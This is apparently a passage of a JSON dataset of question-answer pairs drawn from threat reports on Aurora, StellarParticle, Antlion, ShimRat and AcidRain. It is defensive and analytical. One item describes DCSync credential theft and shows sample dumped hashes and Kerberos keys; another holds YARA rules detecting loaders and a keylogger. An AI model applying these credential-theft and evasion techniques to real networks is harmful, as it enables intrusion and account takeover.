a technical university in China. This individual appears to have repurposed legitimate source code from an Internet services company in the same country for use as part of the campaign's C&C server code. As such, this may be a case in which a malware entrepreneur's code was used in targeted attacks.\nIn addition to understanding the tools and techniques used in this campaign, we had the opportunity to analyze the data to determine its source. While the information that we obtained suggested the identity of the malware author, we were not able to attribute the campaign operation to him. In fact, while we were able to identify the various IP addresses used by the operators, the geographic diversity of the proxy servers and VPNs made it difficult to determine their true origin.\n\nWhat challenges did the investigators face in attributing the Safe campaign to a specific individual or group, despite identifying the malware author?",
    "output": "Despite identifying the malware author as a probable professional software developer who studied at a technical university in China, the investigators faced significant challenges in attributing the Safe campaign to a specific individual or group. Although they could identify various IP addresses used by the operators, the geographic diversity of the proxy servers and VPNs made it difficult to determine the true origin of the attacks. This complexity highlights the challenges in pinpointing the exact source of sophisticated cyber threats, even when certain aspects of the operation are understood.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Copyright Notice\nThe copyright holder of all contents of the \"Technology Blog\" on this site is NSFOCUS Technology Group Co., Ltd. (\"NSFOCUS Technology\"). As a platform for sharing technical information, NSFOCUS looks forward to interacting with the majority of users, and welcomes the full text to be forwarded with the source (NSFOCUS-Technical Blog) and website indicated.\nFor any form of use other than the above, it is necessary to apply for copyright authorization to NSFOCUS (010-68438880-5462) in advance. For unauthorized use, NSFOCUS reserves the right to pursue responsibility. At the same time, if a legal dispute arises due to the unauthorized use of blog content, the user shall bear all legal responsibilities and has nothing to do with NSFOCUS.\nAnswer this question: How does the copyright policy of NSFOCUS Technology Group Co., Ltd. affect the dissemination and usage of information related to the APT group Lorec53?",
    "output": "The copyright policy of NSFOCUS Technology Group Co., Ltd. allows for the full text of their 'Technology Blog' to be forwarded and shared, provided that the source (NSFOCUS-Technical Blog) and the website are indicated. This means that information about the APT group Lorec53 can be freely shared as long as proper attribution is given. However, for any other form of use, such as republishing or modifying the content, prior authorization must be obtained from NSFOCUS. Unauthorized use may result in legal action, and the user would bear all legal responsibilities. This policy ensures that the information about Lorec53 is accurately attributed and protects the intellectual property rights of NSFOCUS.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Previously Disclosed Aurora Knowledge\n\"Operation Aurora\" refers to the investigations of a cyber attack which appeared to have begun in mid-December 2009 and continued through to February 2010. Aurora was first publicly disclosed by Google on January 12, 2010 \u2013 and is commonly associated with attacks originating from China. The Aurora name was originally publicized by Dmitri Alperovitch, Vice President of Threat Research at McAfee, and refers to a file path artifact that might reveal what the criminal authors of the malware named their operation.\nKey facts publicly associated with Aurora:\na) Google stated that some of their intellectual property had been stolen and publicly announced the attack on January 12th 2010.\nb) While the scope of reported victims includes around 34 organizations, only Google, Adobe Systems, Juniper Networks and Rackspace have publicly confirmed that they were targeted. Various media reports have stated that Yahoo, Symantec, Northrop Grumman, Dow Chemical and the Rand Corporation were also among the targets.\nc) Many security agencies and experts claim the attack to be a sophisticated use of \"advanced\" tools and techniques \u2013 most notably the use of a Zero-Day exploit for a previously unknown vulnerability in Microsoft's Internet Explorer 6 browser technology.\nd) The public name for the malware component that allowed the Aurora criminal operators to remotely control their victims system is called Trojan.Hydraq.\ne) The Aurora attacks are widely assumed to be an APT originating from within China.\nMedium Headline: Advanced Persistent Threats\nAdvanced Persistent Threats (APTs) are a cybercrime category directed at business and political targets. APTs require a high degree of stealithiness over a prolonged duration of operation in order to be successful. The attack objectives therefore typically extend beyond immediate financial gain, and compromised systems continue to be of service even after key systems have been breached and initial goals reached.\nDefinitions of precisely what an APT is can vary widely, but can best be summarized by their named requirements:\nAdvanced \u2013 Criminal operators behind the threat utilize the full spectrum of computer intrusion technologies and techniques. While individual components of the attack may not be classed as particularly \"advanced\" (e.g. malware components generated from commonly available DIY construction kits, or the use of easily procured exploit materials), their operators typically access and develop more advanced tools as required. They combine multiple attack methodologies and tools in order to reach and compromise their target.\nPersistent \u2013 Criminal operators give priority to a specific task, rather than opportunistically seeking immediate financial gain. This distinction implies that the attackers are guided by external entities. The attack is conducted through continuous monitoring and interaction of a botnet in order to achieve the defined objectives. It does not mean a barrage of constant attacks and malware updates. In fact, a \"low-and-slow\" approach is usually more successful.\nThreat \u2013 Means that there is a level of coordinated human involvement in the attack. The criminal operators have a specific objective and are skilled, motivated, organized and well funded.\nMedium Headline: Damballa's Perspective\nDamballa's research and technical expertise focuses on the detection of CnC tethering and the malicious communications between a victim's computer and the remote criminal operator. Damballa detects new botnet CnC channels as they are created and used by criminal operators. This globe-spanning array of network sensors monitors CnC use to identify victims that join botnets.\nDamaballa used key DNS observations about the operational characteristics of Dynamic DNS zones (e.g. zone cuts, TTL changes, NS changes, etc.) in order to identify the different states in which the botnet was operated by its criminal controllers. Changes in the way that a DNS zone is structured by criminals typically denotes an intension to develop, test, and operate malicious infrastructure, or abandon a particular zone and move to a new one. Damballa also reviewed historical DNS resolution data derived from our passive observation systems to identify when (and how frequently) the CnC domain names associated with the Aurora botnet were queried. This information provided valuable insight into the pace at which victims rallied to the botnet and established a timeline for Aurora.\nThese network observations combine with Damballa's ability to identify Zero-Day remote access malware and botnet agents within customers' networks to determine additional CnC relationships. Zero-Day malware samples are automatically passed to Damballa's analysis cloud \u2013 along with tens-of-thousands of new malware variants obtained through industry security sharing programs. These network behaviors are extracted, and provide Damballa with additional insight into CnC evolution and criminal ownership. They also allow us to cluster various malware and botnet agents automatically with their respective criminal operators \u2013 despite factors such as serial variant production, migrations to new malware families and sub-contracting malware development to other criminal authors.\nTrojan.Hydraq is the name of a family of malware now synonymous with Operation Aurora. To date, only a handful of related samples have been made public by various security vendors \u2013 almost all of which were gathered through forensic analysis of compromised computers. However, it is important to understand that not only are there multiple variants of malware within the Trojan.Hydraq family, but that criminal operators also use(d) other malware families in their attacks. Based upon analysis of samples and data gathered by Damballa, malware associated with the criminal operators behind the Aurora botnet can be traced back to August 2009.\nA holistic DNS forensic analysis of any botnet that utilizes DNS as a critical communication element requires DNS information from both the iterative and recursive DNS phases. Utilizing large scale passive DNS information from large ISPs and DNS traces from a significant portion of the CnC's DNS authority servers (ANS) Damballa has identified more than many infected hosts that attempted to connect or rally to the five CnC domain names associated with the Aurora botnet and investigated in this report. These hosts where distributed across multiple countries at the time of the public Google disclosure (January 12, 2010).\nDamballa's passive DNS data collection indicates that the infection vector was not centralized, and that a significant number of infected assets tried to look up CnC domain names throughout the US, with a higher frequency in the Northeast.\nSome interesting observations can be made about the lifetime and \"popularity\" of the CnC domains used. The next figure shows that portions of the CnC domain names were active since the beginning of September 2009 (e.g. google.homelinux.com, yahoo.blogdns.net, mcsmc.org). These domain names reveal two important trends \u2013 a downward-spike during the month of October and a steady hit rate for the remaining months. Beside these long-lived CnC domain names, Damballa observed a number of domain names that become active in the early days of November. Some of them were active only for a couple of months (e.g. filoups.info), while others where active longer\n(e.g. m7been.zapto.org, baltika1.servebeer.com, etc.) before they where sinkholed by corresponding DNS operators.\nBig Headline: The Major Components\nBotnets are a business. Professional criminal operators employ specialist tools, services and methodologies to conduct their botnet operations. While botnet discussion has been tied malware families in the past (e.g. \"The Conficker Botnet\", \"The Koobface Botnet\"), today's botnet operators regularly employ multiple families of malware, considering them disposable attack tools. The key elements of a botnet are:\nMalware \u2013 The tool used by botnet operators to conduct malicious activities on victims' computers and to provide remote control capabilities.\nCnC \u2013 The electronic tether between the criminal operator, a control server and victims' computers.\nCnC Domain \u2013 The domain name of the host being used for CnC conduct or to route communications between the control server and the victim's computer.\nCnC Server \u2013 The server used by the botnet operators to rally and provide electronic tethers to victim computers.\nBotnet \u2013 The collective name for malware-infected victims with established connections to a CnC server and remotely controlled by criminal operators.\nCriminal Operators \u2013 The person or team that builds, manages and reaps financial reward from a botnet.\nAnswer this question: How did the Aurora attack demonstrate the characteristics of an Advanced Persistent Threat (APT), and what specific objectives did the attackers pursue?",
    "output": "The Aurora attack demonstrated the characteristics of an APT through its advanced use of tools and techniques, persistence in achieving specific tasks rather than immediate financial gain, and the level of coordinated human involvement. The attackers utilized the full spectrum of computer intrusion technologies, combined multiple attack methodologies, and gave priority to specific tasks guided by external entities. Their objectives extended beyond immediate financial gain, indicating a high degree of stealthiness over a prolonged duration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Credential Theft Using Get-ADReplAccount\nIn one example, the threat actor connected into the victim's environment via a VPN endpoint that did not have MFA enabled. Once connected to the VPN, the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10  PowerShell module to the system. The threat actor subsequently ran the DSInternals command Get-ADReplAccount targeting two of the victim's domains. This command uses the Microsoft Directory Replication Service (MS-DRSR) protocol and specifically the IDL_DRSGetNCChanges method to return account information from Active Directory such as the current NTLM password hashes and previous password hashes used for enforcing password reuse restrictions. A common name for this particular technique is DCSync.11\nAn example output from Get-AdReplAccount is below:\nDistinguishedName: CN=TestUser,OU=Admins,OU=Users,DC=demo,DC=local\nSid: S-1-5-21-1432446722-301123485-1266542393-2012\nGuid: 12321930-7c05-4011-8a3e-e0b9b6e04567\nSamAccountName: TestUser\nSamAccountType: User\nUserPrincipalName: TestUser@demo.local\nPrimaryGroupId: 513\nSidHistory:\nEnabled: True\nUserAccountControl: NormalAccount\nAdminCount: True\nDeleted: False\nLastLogonDate: 12/2/2021 1:41:46 PM\nDisplayName: TestUser\nGivenName: Test\nSurname: User\nDescription: Admin Account\nServicePrincipalName:\nSecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent,\nDiscretionaryAclAutoInherited, SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative\nOwner: S-1-5-21-1432446722-301123485-1266542393-512\nSecrets\nNTHash: 84a058676bb6d7de4237e18f09b91156\nLMHash:\nNTHashHistory:\nHash 01: 84a058676bb6d7de4237e18f09b91156\nHash 02: e047ebb3b7c463928c928fca95ac0ac8\nHash 03: 6dc3cdb3e559ef00d3521351ace7477e\nHash 04: a88355849f35fe7336de23a4ca3e6a9e\nHash 05: de9bde95677672295349aa6e1e857704\nLMHashHistory:\nHash 01: 12227358dd7013c7dbdbd8fdcc0c6668\nHash 02: 6a028636a6f52491424586bb88357f7c\nHash 03: c13ef7347853dc3be7e7259fdc8818a1\nHash 04: 6635151746869ce485246037747adae1\nHash 05: 85543f498b007e07a3da662c8a9d450b\nSupplementalCredentials:\nClearText:\nNTLMStrongHash: de164e3465f163e846a5e1c22a5ac649\nKerberos:\nCredentials:\nDES_CBC_MD5\nKey: 0013364f00003915\nDES_CBC_CRC\nKey: 0013364f00003915\nOldCredentials:\nDES_CBC_MD5\nKey: 00002a46000004bc\nDES_CBC_CRC\nKey: 00002a46000004bc\nSalt: demo.localTestUser\nFlags: 0\nKerberosNew:\nCredentials:\nAES256_CTS_HMAC_SHA1_96\nKey: afd4d60e8d0920bc2f94d551f62f0ea2a17523bf2ff8ffb0fdade2a90389282f\nIterations: 4096\nAES128_CTS_HMAC_SHA1_96\nKey: f67c2bcbfcfa30fccb36f72dca22a817\nIterations: 4096\nDES_CBC_MD5\nKey: 00002f34000004ee\nIterations: 4096\nDES_CBC_CRC\nKey: 00002f34000004ee\nIterations: 4096\nOldCredentials:\nAES256_CTS_HMAC_SHA1_96\nKey: b430783ab4c957cf6a03d3d348af27264c0d872932650ffca712d9ebcf778b9f Iterations: 4096\nAES128_CTS_HMAC_SHA1_96\nKey: dc34bfd5e469edbeada77fac56aa35ae\nIterations: 4096\nDES_CBC_MD5\nKey: 0000345400000520\nIterations: 4096\nDES_CBC_CRC\nKey: 0000345400000520\nIterations: 4096\nOlderCredentials:\nAES256_CTS_HMAC_SHA1_96\nKey: 26efd3593712e555f8366bb4b8aff097d09acd93c3a1b6d4ea03c578aad9e087 Iterations: 4096\nCreated:\nModified:\nCredentials:\nFigure 10. Get-ADReplAccount example output\nWhen executing the Get-ADReplAccount command, the threat actor specified the AD context to be targeted via the NamingContext parameter. This was necessary, as the threat actor was targeting multiple domains. The resulting output of each command was redirected to a text file and compressed as zip archives before exfiltration.\nThe fact that Get-ADReplAccount command includes not only the current NTLM hashes but also the hash history (i.e., hashes of previous passwords used by a user account) meant that the threat actor also had the ability to discover accounts that either reused the same passwords or used similar passwords when the account password was changed.\nBig Headline: Credential Refresh\nOn some investigations, the dwell time of the threat actor spanned years. Given this extended period, it is logical to assume that some credentials obtained by the threat actor would be rotated during normal business operations. To combat this, the threat actor periodically \"refreshed\" their credential set by performing credential theft activities in an already compromised environment. At one victim, CrowdStrike identified multiple instances of domain credential theft months apart, each time with a different credential theft technique.\nOne of the credential theft techniques identified by CrowdStrike was the use of a PowerShell script to execute Mimikatz in-memory. While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256. CrowdStrike was able to reconstruct the PowerShell script from the PowerShell Operational event log as the script's execution was logged automatically due to the use of specific keywords. CrowdStrike recommends that organizations upgrade PowerShell on their systems, as this functionality is only available with PowerShell version 5 and above.\nIn addition to refreshing the threat actor's credentials, the threat actor would also refresh their understanding of the victim's AD environment. Around the time when the threat actor executed Get-ADReplAccount , the threat actor also executed a renamed version of AdFind to output domain reconnaissance information. In this instance, AdFind was renamed to masquerade as a legitimate Windows binary. The usage of renamed AdFind is consistent with other industry reporting on this campaign.\nIn addition to using scripted commands, operators were repeatedly observed manually executing several standard PowerShell cmdlets to enumerate network information from AD, including Get-ADUser and Get-ADGroupMember to query specific members in the directory. This information provided the adversary with a list of accounts possessing particular privileges \u2014 in this case, the ability to make VPN connections \u2014 that would be subject to later credential stealing attempts and leveraged to access the victim at a later time.\nBig Headline: Password Policies/Hygiene\nIn some cases, the threat actor was able to quickly return to the environment and essentially pick up where they left off, even though the organization had performed an enterprise-wide password reset, including a reset of all service accounts and the double-reset of the krbtgt account. CrowdStrike determined that in these cases, administrative users had \"reset\" their own password to the same password they previously used, essentially nullifying the impact of the enterprise-wide reset. This was possible even though the customer's Active Directory was configured to require new passwords to be different from the previous five passwords for a given account. Unfortunately, this check only applies when a user is changing their password via the \"password change\" method \u2014 but if a \"password reset\" is performed (changing the password without knowing the previous password), this check is bypassed for an administrative user or a Windows account that has the Reset Password permission on a user's account object.12  Since the Get-ADReplAccount cmdlet described above included the NTHashHistory values (i.e., previous password hashes) for user accounts, CrowdStrike was able to verify that some administrative accounts indeed had the exact same password hash showing up multiple times in the password history, as well as in the current NTHash value.\nBig Headline: Close Out\nThe StellarParticle campaign, associated with the COZY BEAR adversary group, demonstrates this threat actor's extensive knowledge of Windows and Linux operating systems, Microsoft Azure, O365, and Active Directory, and their patience and covert skill set to stay undetected for months \u2014 and in some cases, years.\nA special thank you to the CrowdStrike Incident Response and CrowdStrike Intelligence teams for helping make this blog possible, especially Ryan McCombs, Ian Barton, Patrick Bennet, Alex Parsons, Christopher Romano, Jackson Roussin and Tom Goldsmith.\n\nWhat strategies did the threat actor employ to refresh their credentials and maintain access over extended periods in the StellarParticle campaign?",
    "output": "A: The threat actor employed several strategies to refresh their credentials and maintain access over extended periods. They periodically 'refreshed' their credential set by performing credential theft activities in an already compromised environment. One of the techniques identified was the use of a heavily obfuscated PowerShell script to execute Mimikatz in-memory, which encrypted the output using AES256. Additionally, the threat actor refreshed their understanding of the victim's AD environment by executing a renamed version of AdFind to output domain reconnaissance information. They also manually executed PowerShell cmdlets like Get-ADUser and Get-ADGroupMember to enumerate network information from AD, providing them with a list of accounts possessing particular privileges.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Experienced actor stays active\nAntlion is believed to have been involved in espionage activities since at least 2011, and this recent activity shows that it is still an actor to be aware of more than 10 years after it first appeared.\nThe length of time that Antlion was able to spend on victim networks is notable, with the group able to spend several months on victim networks, affording plenty of time to seek out and exfiltrate potentially sensitive information from infected organizations. The targeting of Taiwan is perhaps unsurprising given we know Chinese state-backed groups tend to be interested in organizations in that region.\nBig Headline: Yara Rules\nrule xpack_loader\n{\nmeta:\nauthor = \"Symantec, a division of Broadcom\"\nhash = \"12425edb2c50eac79f06bf228cb2dd77bb1e847c4c4a2049c91e0c5b345df5f2\"\nstrings:\n$s1 = \"Length or Hash destoryed\" wide fullword\n$s2 = \"tag unmatched\" wide fullword\n$s3 = \"File size mismatch\" wide fullword\n$s4 = \"DESFile\" wide fullword\n$p1 = \"fomsal.Properties.Resources.resources\" wide fullword\n$p2 = \"xPack.Properties.Resources.resources\" wide fullword\n$p3 = \"foslta.Properties.Resources.resources\" wide fullword\ncondition:\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and (2 of ($s*) or any of ($p*))\n}\nrule xpack_service\n{\nmeta:\nauthor = \"Symantec, a division of Broadcom\"\nhash = \"390460900c318a9a5c9026208f9486af58b149d2ba98069007218973a6b0df66\"\nstrings:\n$s1 = \"C:\\\\Windows\\\\inf\\\\wdnvsc.inf\" wide fullword\n$s2 = \"PackService\" wide fullword\n$s3 = \"xPackSvc\" wide fullword\n$s4 = \"eG#!&5h8V$\" wide fullword\ncondition:\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 3 of them\n}\nrule EHAGBPSL_loader\n{\nmeta:\nauthor = \"Symantec, a division of Broadcom\"\nhash = \"e968e0d7e62fbc36ad95bc7b140cf7c32cd0f02fd6f4f914eeb7c7b87528cfe2\"\nhash = \"2a541a06929dd7d18ddbae2cb23d5455d0666af7bdcdf45b498d1130a8434632\"\nstrings:\n$s1 = {45 00 00 00 48 00 00 00 41 00 00 00 47 00 00 00 42 00 00 00 50 00 00 00 53 00 00 00 4C} // EHAGBPSL\n$s2 = {74 00 00 00 61 00 00 00 72 00 00 00 57 00 00 00 6F 00 00 00 6B} // tarWok\n$b1 = \"bnRtZ3M=\" fullword // ntmgs\n$b2 = \"TmV0d29yayBNYW5hZ2VtZW50IFNlcnZpY2U=\" fullword // Network Management Service\n$b3 = \"UHJvdmlkZXMgYWJpbGl0eSB0byBtYW5hZ2UgbmV0d29yayBvdmVyIHRoZSBuZXQgcHJvdG9jb2wu\" fullword // Provides ability to manage network over the net protocol.\n$b4 = \"bnRtZ3MuZG\" // ntmgs.dll / ntmgs.dat\n$b5 = \"aW1nMS5qcGc=\" fullword // img1.jpg\n$c1 = \"Wscms.nls\" fullword\n$c2 = \"Wscms.dat\" fullword\n$c3 = \"Wscms.dll\" fullword\n$c4 = \"Wscms.ini\" fullword\n$c5 = \"Images01.jpg\" fullword\n$e1 = \"StartWork\" fullword\n$e2 = \"ServiceMain\" fullword\n$h1 = {DD 9C BD 72} // CreateRemoteThread\n$h2 = {C0 97 E2 EF} // OpenProcess\n$h3 = {32 6D C7 D5} // RegisterServiceCtrlHandlerA\n$h4 = {A1 6A 3D D8} // WriteProcessMemory\ncondition:\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and all of ($e*) and (all of ($s*) or any of ($b*) or 3 of ($c*) or all of ($h*))\n}\nrule keylogger\n{\nmeta:\nauthor = \"Symantec, a division of Broadcom\"\nhash = \"3db621cac1d026714356501f558b1847212c91169314c1d43bfc3a4798467d0d\"\nhash = \"789f0ec8e60fbc8645641a47bc821b11a4486f28892b6ce14f867a40247954ed\"\nstrings:\n$m1 = \"BKB_Test\" fullword\n$m2 = \"KLG_sd76bxds1N\" fullword\n$k1 = \"[%d/%02d/%02d %02d:%02d:%02d K-E-Y-L-O-G]\" fullword\n$k2 = \"[%d/%02d/%02d %02d:%02d:%02d C-L-I-P-B-D]\" fullword\n$k3 = \"< Title--%s-- >\" fullword\n$k4 = \"ImpersonateLoggedOnUser Error(%d)\" fullword\n$f1 = {55 73 65 72 ?? ?? ?? 00 00 00 ?? ?? ?? 6B 65 79 2E} // Userkey.\n$f2 = {55 73 65 72 ?? ?? ?? 00 00 00 ?? ?? ?? 64 61 74 2E} // Userdat.\ncondition:\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and (2 of ($k*) or (any of ($m*) and any of ($f*)))\n}\nrule checkid_loader\n{\nmeta:\nauthor = \"Symantec, a division of Broadcom\"\ndescription = \"BlackHole/BlackSwan / QuasarRAT/xClient loader\"\nhash = \"29d7b82f9ae7fa0dbaf2d18c4d38d18028d652ed1ccc0846e8c781b4015b5f78\"\nstrings:\n$s1 = \"Call %s.%s(\\\"%s\\\") => %d\" fullword wide\n$s2 = \"Assembly::CreateInstance failed w/hr 0x%08lx\" fullword wide\n$s3 = \"checkID\"\n$s4 = \"NULL == checkID hMutex\" fullword\n$s5 = \"checkID Mutex ERROR_ALREADY_EXISTS\" fullword\n$s6 = \"dllmain mutex ERROR_ALREADY_EXISTS\" fullword\n$x1 = \"xClient.Program\" fullword wide\n$x2 = \"LoadPayload\" fullword\n$m1 = \"SFZJ_Wh16gJGFKL\" ascii wide\n$m2 = \"d5129799-e543-4b8b-bb1b-e0cba81bccf8\" ascii wide\n$m3 = \"USA_HardBlack\" ascii wide\n$b1 = \"BlackHole.Slave.Program\" fullword wide\n$b2 = \"NuGet\\\\Config\" wide\n$b3 = \"VisualStudio.cfi\" wide\n$p = {E1 F6 3C AC AF AC AC AC A8 AC AC AC 53 53 AC AC 14}\n$t = \"0s+Nksjd1czZ1drJktPO24aEjISMtsvLy5LJzNjdyNnL1dLY08uS39PRhoSMhIy2jYyPkomNko2IjJKEiIaEjISM\"\ncondition:\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 2 of ($s*) and (all of ($x*) or any of ($m*) or all of ($b*) or $p or $t)\n}\nThe Threat Hunter Team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced protection in Symantec products, and offer analysis that helps customers respond to attacks.\nAnswer this question: How does the persistence and longevity of Antlion's presence on victim networks contribute to its effectiveness in espionage activities?",
    "output": "Antlion's ability to remain on victim networks for several months allows the group to thoroughly seek out and exfiltrate potentially sensitive information. This extended period provides ample time for the attackers to navigate through the network, identify valuable data, and stage it for exfiltration without raising immediate suspicion. The lengthy duration of their presence significantly enhances their chances of successful espionage.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 2 Ukraine as a Cyber Safe Haven\nOnce the internet conquered post-Soviet daily life, many talented computer programmers who had already dabbled in illegal activities such as stealing music and movies realised that they could make a living as professional hackers. There were few cyber security regulations in Ukraine and so, as in so many other countries, cyber crime quickly evolved from a mischievous hobby to a lucrative occupation.8\nSeveral factors contributed to making Ukraine a cyber safe haven. First, its Soviet school STEM (science, technology, engineering, and mathematics) education is among the best in the world. Second, its underwhelming economic performance since independence in 1991 has led these STEM specialists to explore alternative career paths, often online. Third, Ukraine's social and cultural norms dictate that stealing from the West is not always a bad thing. This factor is compounded by the relatively impersonal nature of cyberspace.9\nAt the policy level, 'cyber crimes' such as stealing intellectual property and copyright infringement were not even considered illegal in Ukraine until recently. For instance, the popular Russian social media website vkontakte.ru used to be a source of large-scale music and movie piracy.10 Ukraine recently has begun to develop a common lexicon on cyber security (a pre-requisite for progress in this\nnew domain),11 but the multiple cyber units within the Ukrainian government12 still tend to operate independently, and rarely collaborate.13 Moreover, as in other Eastern European countries, government employees are poorly paid and lack resources, which in turn motivates skilled specialists to leave for the private sector. Finally, due to the high level of corruption in Ukraine, even when a cyber criminal is caught, he or she can usually bribe an official to have the charges reduced or dropped.14\n7 Vlad Styran, Skype interview, July 6, 2015.\n8 Supra, note 5.\n9 The author can testify through personal experience.\n10 Kathryn Dowling. 'VKontakte Case Puts Russian Music Piracy into Spotlight.' August 11, 2014. http://www.bbc.com/news/ business-28739602.\n\nHow did the lack of legal framework and government coordination in Ukraine contribute to the proliferation of cybercrime, and what steps have been taken to address this issue?",
    "output": "A: The lack of a robust legal framework in Ukraine meant that cyber crimes such as intellectual property theft and copyright infringement were not considered illegal until recently. This absence of regulation allowed cybercrime to flourish. Additionally, the multiple cyber units within the Ukrainian government operated independently and rarely collaborated, further hindering effective enforcement. Poorly paid government employees and high levels of corruption exacerbated the problem, as cyber criminals could often bribe officials to avoid prosecution. Recently, Ukraine has started developing a common lexicon on cyber security, which is a pre-requisite for progress in this new domain, although significant challenges remain.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 7.1 ShimRat\nShimRat is a custom developed piece of malware known as a 'RAT', Remote Administration Tool. It has among others standard capabilities for filesystem interaction.\nThe malware was originally built in 2012 and its features were expanded over the years. The artifacts left in the first samples, are a good indicator that the project has been started in 2012. Multiple pdB paths were seen in the early versions of ShimRat. These PDB paths are not visible in the latest versions of ShimRat, due to how the samples are prepared. The PDB paths are either stripped or filled with different paths.\nz:\\project2012\\remotecontrol\\winhttpnet\\amcy\\app\\win7\\installscript\\objfre_wxp_x86\\i386\\InstallScript.pdb z:\\project2012\\remotecontrol\\winhttpnet\\amcy\\app\\win7\\serviceapp\\objfre_wxp_x86\\i386\\ServiceApp.pdb z:\\project2012\\remotecontrol\\winhttpnet\\cqgaen\\app\\installscript\\objfre_wxp_x86\\i386\\InstallScript.pdb z:\\project2012\\remotecontrol\\winhttpnet\\cqgaen\\app\\serviceapp\\objfre_wxp_x86\\i386\\ServiceApp.pdb\nThe terms InstallScript and ServiceApp in the pdB paths are the two parts that malware consists of. InstallScript is the first stage of ShimRat which takes care of persistence, while ServiceApp is the second stage of the malware which performs C2 communication and exposes the infected machine to the operator.\nOver the years the developers of ShimRat have extended the malware with additional functionality, such as:\n\u2022 Persistence: originally ShimRat only supported registry startup keys and service creation in order to become persistent. Additionally, the authors developed the capability of installing a shim database for persistence in 2015.\n\u2022 Privilege elevation: a method to bypass Windows uac to gain higher privileges was implemented. The technique relied on the Migwiz Windows component. Migwiz is an application used in Windows which automatically runs in high integrity mode10 . The hijacked DLL will also run in this mode allowing a uac bypass, one of many methods that exists11 . This method was not developed by the ShimRat authors, but was public and the changes are even they simply copied it into their malware.\nOne interesting technique they've been using is dll hijacking of antivirus components. ShimRat samples delivered from around end 2013/start 2014 on, abused legitimate antivirus applications to hijack. The reason for this is to hide itself even more. When a user would check the running process list, a legitimate Antivirus process would appear to be running. The exact list of applications is available in paragraph 9.4. The Mofang group has a preference for Antivirus products only. fox-it has not observed any other vulnerable application except for antivirus products being used.\nMofang packages the anti-virus components with 2 files in order to run ShimRat. One is the dll to hijack. The second file is a compressed ShimRat core dll with shellcode in a .dat file. When the antivirus component is started the dll is loaded which in turn maps the .dat file in memory. The shellcode subsequently decompresses the core of ShimRat which comes in the form of a dll and executes it. Usually the .dat file has the same name as the dll file.\nThe way samples arrive at targets is usually in a packed form containing a lure document. The initial payload a target receives, will extract a lure document, present the user with this, but also extracts and runs a 2nd stage loader which will drop ShimRat on the target system. This 2nd stage loader in the current version of ShimRat and contains the antivirus component and as well as the two auxiliary files containing the ShimRat core.\n\nHow does the Mofang group achieve persistence with ShimRat, and what additional method did they develop in 2015?",
    "output": "A: The Mofang group achieves persistence with ShimRat through several methods. Initially, ShimRat supported registry startup keys and service creation. In 2015, the authors developed an additional capability of installing a shim database for persistence. This evolution showcases the group's effort to enhance the malware's ability to maintain its presence on infected systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Executive Summary\nOn Thursday, February 24th, 2022, a cyber attack rendered Viasat KA-SAT modems inoperable in Ukraine.\nSpillover from this attack rendered 5,800 Enercon wind turbines in Germany unable to communicate for remote monitoring or control.\nViasat's statement on Wednesday, March 30th, 2022 provides a somewhat plausible but incomplete description of the attack.\nSentinelLabs researchers discovered new malware that we named 'AcidRain'.\nAcidRain is an ELF MIPS malware designed to wipe modems and routers.\nWe assess with medium-confidence that there are developmental similarities between AcidRain and a VPNFilter stage 3 destructive plugin. In 2018, the FBI and Department of Justice attributed the VPNFilter campaign to the Russian government\nAcidRain is the 7th wiper malware associated with the Russian invasion of Ukraine.\nUpdate: In a statement disseminated to (<https://twitter.com/zackwhittaker/status/1509601023047970820?s=20&t=Y0xOUSXVK1AIbaBGXDsnLQ>)journalists, Viasat confirmed the use of the AcidRain wiper in an attack against their modems.\nBig Headline: Context\nThe Russian invasion of Ukraine has included a wealth of cyber operations that have tested our collective assumptions about the role that cyber plays in modern warfare. Some commentators have voiced a(<https://www.washingtonpost.com/politics/2022/03/07/putins-invasion-ukraine-didnt-rely-cyber-warfare-heres-why/>) bizarre disappointment at the 'lack of cyber' while those at the coalface are overwhelmed by the (<https://www.nytimes.com/2022/03/18/opinion/cyberwar-ukraine-russia.html>)abundance of cyber operations accompanying conventional warfare. From the beginning of 2022, we have dealt with six different strains of wiper malware targeting Ukraine: WhisperKill, WhisperGate, (<https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/>)HermeticWiper, IsaacWiper, CaddyWiper, and DoubleZero. These attacks are notable on their own. But there's been an elephant in the room by way of the rumored 'satellite modem hack'. This particular attack goes beyond Ukraine.\nmilitary command-and-control capabilities by hindering satellite connectivity spilled over to (<https://www.reversemode.com/2022/03/satcom-terminals-under-attack-in-europe.html>)affect German critical infrastructure. No technical details became available; technical speculation has been rampant.\nOn Wednesday, March 30th, 2022, Viasat finally  stating that the attack took place in two phases: First, a denial of service attack coming from \"several SurfBeam2 and SurfBeam2+ modems and [\u2026other on-prem equipment\u2026] physically located within Ukraine\" that temporarily knocked KA-SAT modems offline. Then, the gradual disappearance of modems from the Viasat service. The actual service provider is in the midst of a complex arrangement where Eutalsat provides the service, but it's administered by an Italian company called Skylogic as part of a transition plan.\nBig Headline: The Viasat Explanation\nAt the time of writing, Viasat has not provided any technical indicators nor an incident response report. They did provide a general sense of the attack chain with conclusions that are difficult to reconcile.\nViasat reports that the attackers exploited a misconfigured VPN appliance, gained access to the trust management segment of the KA-SAT network, moved laterally, then used their access to \"execute legitimate, targeted management commands on a large number of residential modems 